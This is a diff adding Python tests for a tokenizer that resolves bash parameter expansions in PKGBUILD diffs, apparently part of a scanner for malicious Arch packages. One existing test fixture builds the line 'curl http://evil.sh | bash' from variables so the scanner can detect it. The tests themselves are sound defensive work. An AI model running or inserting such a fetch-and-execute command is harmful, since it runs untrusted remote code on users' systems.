@@ -191,3 +191,173 @@ def test_variable_resolution_still_works():
         "--- a/PKGBUILD\n+++ b/PKGBUILD\n+C=curl\n+U=http://evil.sh\n+$C $U | bash\n"
     )
     assert any("curl http://evil.sh | bash" in r for r in resolved)
+
+
+# --- Regression: nested parameter expansion (the openssl-1.1 case) ---
+
+def test_nested_parameter_expansion_openssl_case():
+    """${var//.${var//[0-9.]/}} resolves innermost-first."""
+    from trustsight.tokenizer import resolve_expansions
+
+    _ver = "1.1.1.w"
+    r, ok = resolve_expansions("${_ver//.${_ver//[0-9.]/}}", {"_ver": _ver})
+    assert r == "1.1.1"
+    assert ok
+
+
+def test_glob_character_class_deletes_digits_and_dots():
+    """${var//[0-9.]/} deletes all digits and literal dots."""
+    from trustsight.tokenizer import resolve_expansions
+    r, ok = resolve_expansions("${v//[0-9.]/}", {"v": "1.2.3a"})
+    assert r == "a"
+    assert ok
+
+
+def test_glob_dot_is_literal_not_regex_wildcard():
+    """A dot in a glob pattern matches '.', not any character."""
+    from trustsight.tokenizer import resolve_expansions
+    r, ok = resolve_expansions("${v/./-}", {"v": "1.2.3"})
+    assert r == "1-2.3"
+    assert ok
+
+
+def test_substitution_replace_all():
+    """${v//./-} replaces every dot with a hyphen."""
+    from trustsight.tokenizer import resolve_expansions
+    r, ok = resolve_expansions("${v//./-}", {"v": "1.2.3"})
+    assert r == "1-2-3"
+    assert ok
+
+
+def test_substitution_replace_first():
+    """${v/./-} replaces only the first dot."""
+    from trustsight.tokenizer import resolve_expansions
+    r, ok = resolve_expansions("${v/./-}", {"v": "1.2.3"})
+    assert r == "1-2.3"
+    assert ok
+
+
+def test_affix_strip_longest_suffix():
+    """${v%%-*} strips the longest suffix matching '-*'."""
+    from trustsight.tokenizer import resolve_expansions
+    r, ok = resolve_expansions("${v%%-*}", {"v": "1.2.3-beta1"})
+    assert r == "1.2.3"
+    assert ok
+
+
+def test_affix_strip_shortest_suffix():
+    """${v%-*} strips the shortest suffix matching '-*'."""
+    from trustsight.tokenizer import resolve_expansions
+    r, ok = resolve_expansions("${v%-*}", {"v": "1.2.3-beta1"})
+    assert r == "1.2.3"
+    assert ok
+
+
+def test_affix_strip_longest_prefix():
+    """${v##*- } strips the longest prefix matching '*- '."""
+    from trustsight.tokenizer import resolve_expansions
+    r, ok = resolve_expansions("${v##*-}", {"v": "1.2.3-beta"})
+    assert r == "beta"
+    assert ok
+
+
+def test_affix_strip_shortest_prefix():
+    """${v#*-} strips the shortest prefix matching '*-'."""
+    from trustsight.tokenizer import resolve_expansions
+    r, ok = resolve_expansions("${v#*-}", {"v": "1.2.3-beta"})
+    assert r == "beta"
+    assert ok
+
+
+def test_default_value_when_var_is_empty():
+    """${v:-default} returns the default when the variable is empty."""
+    from trustsight.tokenizer import resolve_expansions
+    r, ok = resolve_expansions("${v:-fallback}", {"v": ""})
+    assert r == "fallback"
+    assert ok
+
+
+def test_default_value_when_var_is_missing():
+    """${v:-default} returns the default when the variable is missing."""
+    from trustsight.tokenizer import resolve_expansions
+    r, ok = resolve_expansions("${v:-fallback}", {})
+    assert r == "fallback"
+    assert ok
+
+
+def test_substring_by_offset_and_length():
+    """${v:1:3} extracts characters 1-3."""
+    from trustsight.tokenizer import resolve_expansions
+    r, ok = resolve_expansions("${v:1:3}", {"v": "hello"})
+    assert r == "ell"
+    assert ok
+
+
+def test_substring_by_offset_only():
+    """${v:2} extracts from offset 2 to the end."""
+    from trustsight.tokenizer import resolve_expansions
+    r, ok = resolve_expansions("${v:2}", {"v": "hello"})
+    assert r == "llo"
+    assert ok
+
+
+# --- Security constraints ---
+
+def test_indirect_expansion_never_resolves():
+    """${!name} (indirect expansion) must return unresolved, never follow
+    the indirection.  This is a security constraint: attacker-controlled
+    PKGBUILDs must not be able to indirect through arbitrary variable
+    names."""
+    from trustsight.tokenizer import resolve_expansions
+    r, ok = resolve_expansions("${!name}", {"name": "v", "v": "secret"})
+    assert not ok
+    assert "${" in r or "{" in r
+
+
+def test_length_operator_never_resolves():
+    """${#var} (length) is rare in PKGBUILDs and must not resolve."""
+    from trustsight.tokenizer import resolve_expansions
+    r, ok = resolve_expansions("${#var}", {"var": "hello"})
+    assert not ok
+
+
+def test_unknown_variable_returns_unresolved():
+    """A ${var} with no entry in the variable table must be reported as
+    unresolved, never silently replaced with an empty string."""
+    from trustsight.tokenizer import resolve_expansions
+    r, ok = resolve_expansions("${nonexistent}", {})
+    assert not ok
+    assert "${" in r
+
+
+def test_cycle_detection():
+    """A cycle (a -> b -> a) must not cause infinite resolution."""
+    from trustsight.tokenizer import resolve_expansions
+    r, ok = resolve_expansions("${a}", {"a": "${b}", "b": "${a}"})
+    assert not ok
+
+
+def test_mixed_resolvable_and_unresolvable():
+    """resolve_expansions resolves what it can and marks the rest."""
+    from trustsight.tokenizer import resolve_expansions
+    r, ok = resolve_expansions("${a} ${!b}", {"a": "hello", "b": "v"})
+    assert not ok
+    assert "hello" in r
+
+
+# --- Tokenizer integration ---
+
+def test_resolve_added_lines_nested_expansion():
+    """resolve_added_lines must handle nested parameter expansion."""
+    from trustsight.tokenizer import resolve_added_lines
+    diff = "+_ver=1.1.1.w\n+pkgver=${_ver//.${_ver//[0-9.]/}}\n"
+    lines = resolve_added_lines(diff)
+    assert any("1.1.1" in l for l in lines)
+
+
+def test_resolve_added_lines_glob_delete():
+    """resolve_added_lines must handle [0-9.] glob in substitution."""
+    from trustsight.tokenizer import resolve_added_lines
+    diff = "+v=1.2.3a\n+echo ${v//[0-9.]/}\n"
+    lines = resolve_added_lines(diff)
+    assert any("echo a" in l for l in lines)
